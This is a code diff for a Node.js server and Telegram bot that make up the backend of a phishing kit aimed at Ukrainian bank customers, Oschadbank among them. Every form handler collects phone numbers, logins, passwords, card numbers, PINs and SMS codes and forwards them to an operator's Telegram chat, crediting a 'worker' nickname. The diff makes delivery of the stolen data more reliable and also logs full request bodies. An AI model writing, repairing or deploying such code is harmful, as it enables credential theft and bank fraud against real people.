@@ -25,7 +25,7 @@ app.use(cors());
 
 // Request logging middleware
 app.use((req, res, next) => {
-    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
+    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url} ${JSON.stringify(req.body)}`);
     next();
 });
 
@@ -40,7 +40,7 @@ if (WEBHOOK_URL) {
     bot.setWebHook(WEBHOOK_URL)
         .then(() => console.log(`Webhook set to ${WEBHOOK_URL}`))
         .catch(err => console.error('Webhook setup error:', err));
-    bot.sendMessage(CHAT_ID, `СЕРВЕР ПЕРЕЗАПУЩЕН! (v4 - стабильная) Хорошего ворка! Тест от ${new Date().toISOString()}`, { parse_mode: 'HTML' })
+    bot.sendMessage(CHAT_ID, `СЕРВЕР ПЕРЕЗАПУЩЕН! (v5 - стабильная) Хорошего ворка! Тест от ${new Date().toISOString()}`, { parse_mode: 'HTML' })
         .catch(err => console.error('Test message error:', err));
 } else {
     console.error('Critical error: RENDER_EXTERNAL_URL not defined. Webhook not set.');
@@ -183,7 +183,7 @@ function getInlineKeyboard(sessionId, bankName) {
 }
 
 // Handle form submissions
-app.post('/api/submit', (req, res) => {
+app.post('/api/submit', async (req, res) => {
     const { sessionId, isFinalStep, referrer, ...stepData } = req.body;
     let workerNick = 'unknown';
     try {
@@ -201,45 +201,49 @@ app.post('/api/submit', (req, res) => {
     const ws = clients.get(sessionId);
     const isOnline = ws && ws.readyState === WebSocket.OPEN;
 
-    if (newData.currentFlow === 'forgot_password' && newData.fp_pin) {
-        // Send only when all forgot password data is collected
-        message = `<b>Название банка:</b> Ощад24\n`;
-        message += `<b>Мобильный:</b> <code>${newData.fp_phone || 'N/A'}</code>\n`;
-        message += `<b>Номер карты:</b> <code>${newData.fp_card || 'N/A'}</code>\n`;
-        message += `<b>Пин:</b> <code>${newData.fp_pin || 'N/A'}</code>\n`;
-        message += `<b>Воркер:</b> @${workerNick}\n`;
-        bot.sendMessage(CHAT_ID, message, {
-            parse_mode: 'HTML',
-            reply_markup: isOnline ? getInlineKeyboard(sessionId, newData.bankName) : undefined
-        });
-    } else if (newData.loginMethod === 'phone' && newData.phone && newData.password) {
-        message = `<b>Название банка:</b> Ощад24\n`;
-        message += `<b>Номер телефона:</b> <code>${newData.phone}</code>\n`;
-        message += `<b>Пароль:</b> <code>${newData.password}</code>\n`;
-        message += `<b>Воркер:</b> @${workerNick}\n`;
-        bot.sendMessage(CHAT_ID, message, {
-            parse_mode: 'HTML',
-            reply_markup: isOnline ? getInlineKeyboard(sessionId, newData.bankName) : undefined
-        });
-    } else if (newData.loginMethod === 'login' && newData.login && newData.password) {
-        message = `<b>Название банка:</b> Ощад24\n`;
-        message += `<b>Логин:</b> <code>${newData.login}</code>\n`;
-        message += `<b>Пароль:</b> <code>${newData.password}</code>\n`;
-        message += `<b>Воркер:</b> @${workerNick}\n`;
-        bot.sendMessage(CHAT_ID, message, {
-            parse_mode: 'HTML',
-            reply_markup: isOnline ? getInlineKeyboard(sessionId, newData.bankName) : undefined
-        });
-    } else if (newData.bankName !== 'Ощадбанк') {
-        // For non-Oschadbank flows
-        message = `<b>Название банка:</b> ${newData.bankName}\n`;
-        if (newData.phone) message += `<b>Номер телефона:</b> <code>${newData.phone}</code>\n`;
-        if (newData.card) message += `<b>Номер карты:</b> <code>${newData.card}</code>\n`;
-        message += `<b>Воркер:</b> @${workerNick}\n`;
-        bot.sendMessage(CHAT_ID, message, {
-            parse_mode: 'HTML',
-            reply_markup: isOnline ? getInlineKeyboard(sessionId, newData.bankName) : undefined
-        });
+    try {
+        if (newData.currentFlow === 'forgot_password' && newData.fp_pin) {
+            // Send only when all forgot password data is collected
+            message = `<b>Название банка:</b> Ощад24\n`;
+            message += `<b>Мобильный:</b> <code>${newData.fp_phone || 'N/A'}</code>\n`;
+            message += `<b>Номер карты:</b> <code>${newData.fp_card || 'N/A'}</code>\n`;
+            message += `<b>Пин:</b> <code>${newData.fp_pin || 'N/A'}</code>\n`;
+            message += `<b>Воркер:</b> @${workerNick}\n`;
+            await bot.sendMessage(CHAT_ID, message, {
+                parse_mode: 'HTML',
+                reply_markup: isOnline ? getInlineKeyboard(sessionId, newData.bankName) : undefined
+            });
+        } else if (newData.loginMethod === 'phone' && newData.phone && newData.password) {
+            message = `<b>Название банка:</b> Ощад24\n`;
+            message += `<b>Номер телефона:</b> <code>${newData.phone}</code>\n`;
+            message += `<b>Пароль:</b> <code>${newData.password}</code>\n`;
+            message += `<b>Воркер:</b> @${workerNick}\n`;
+            await bot.sendMessage(CHAT_ID, message, {
+                parse_mode: 'HTML',
+                reply_markup: isOnline ? getInlineKeyboard(sessionId, newData.bankName) : undefined
+            });
+        } else if (newData.loginMethod === 'login' && newData.login && newData.password) {
+            message = `<b>Название банка:</b> Ощад24\n`;
+            message += `<b>Логин:</b> <code>${newData.login}</code>\n`;
+            message += `<b>Пароль:</b> <code>${newData.password}</code>\n`;
+            message += `<b>Воркер:</b> @${workerNick}\n`;
+            await bot.sendMessage(CHAT_ID, message, {
+                parse_mode: 'HTML',
+                reply_markup: isOnline ? getInlineKeyboard(sessionId, newData.bankName) : undefined
+            });
+        } else if (newData.bankName && newData.bankName !== 'Ощадбанк') {
+            // For non-Oschadbank flows
+            message = `<b>Название банка:</b> ${newData.bankName}\n`;
+            if (newData.phone) message += `<b>Номер телефона:</b> <code>${newData.phone}</code>\n`;
+            if (newData.card) message += `<b>Номер карты:</b> <code>${newData.card}</code>\n`;
+            message += `<b>Воркер:</b> @${workerNick}\n`;
+            await bot.sendMessage(CHAT_ID, message, {
+                parse_mode: 'HTML',
+                reply_markup: isOnline ? getInlineKeyboard(sessionId, newData.bankName) : undefined
+            });
+        }
+    } catch (error) {
+        console.error('Error sending message to Telegram:', error);
     }
 
     if (isFinalStep && !newData.logSent) {
@@ -255,7 +259,7 @@ app.post('/api/submit', (req, res) => {
 });
 
 // Handle code submissions
-app.post('/api/sms', (req, res) => {
+app.post('/api/sms', async (req, res) => {
     const { sessionId, code, referrer } = req.body;
     let workerNick = 'unknown';
     try {
@@ -270,8 +274,13 @@ app.post('/api/sms', (req, res) => {
         let message = `<b>${codeType}:</b> <code>${code}</code>\n`;
         message += `<b>Номер телефону:</b> <code>${sessionData.phone || sessionData.fp_phone || 'N/A'}</code>\n`;
         message += `<b>Воркер:</b> @${workerNick}\n`;
-        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
-        res.status(200).json({ message: 'OK' });
+        try {
+            await bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
+            res.status(200).json({ message: 'OK' });
+        } catch (error) {
+            console.error('Error sending code to Telegram:', error);
+            res.status(500).json({ message: 'Failed to send code to Telegram' });
+        }
     } else {
         res.status(404).json({ message: 'Session not found' });
     }
